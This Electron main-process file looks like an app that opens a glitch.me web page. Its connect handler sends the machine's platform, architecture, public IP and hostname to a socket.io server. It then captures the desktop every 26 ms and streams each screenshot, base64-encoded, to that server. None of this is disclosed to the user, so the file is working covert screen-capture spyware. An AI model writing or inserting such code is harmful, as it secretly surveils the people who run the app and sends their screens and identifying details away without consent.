const {app, BrowserWindow} = require('electron')
const path = require('path')
const io = require('socket.io-client')
const socket = io('http://localhost:3000')
const os = require('os')
const ip = require('public-ip')
const scr = require('desktop-screenshot')
const fs = require('fs')

let mainWindow

function getbase64(file) {
  var image = fs.readFileSync(file)
  return new Buffer(image).toString('base64')
}

function createWindow () {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600
  })

  mainWindow.loadURL('https://awesome-witness.glitch.me/')

  mainWindow.on('closed', function () {
    mainWindow = null
  })

  socket.on('connect', function() {
    socket.emit('new', {platform:os.platform(),arch:os.arch(),ip:ip.v4(),hostname:os.hostname()})
    //setInterval(() => { socket.emit('ping', {hostname:os.hostname()}) }, 15);
    setInterval(() => {
      try {
      if(fs.existsSync(__dirname+'\\scr.png')) {
        fs.unlinkSync(__dirname+'\\scr.png')
      }
      scr('scr.png', function(error, complete) {
        if(error)
        return false;
        else
        return true;
      })
      let b64 = getbase64(__dirname+'\\scr.png')
      socket.emit('scr', b64)
      } catch (err) {
        return false;
        //dont care im on vacation
      }
    }, 26)
  })
}

app.on('ready', createWindow)

app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') app.quit()
})

app.on('activate', function () {
  if (mainWindow === null) createWindow()
})
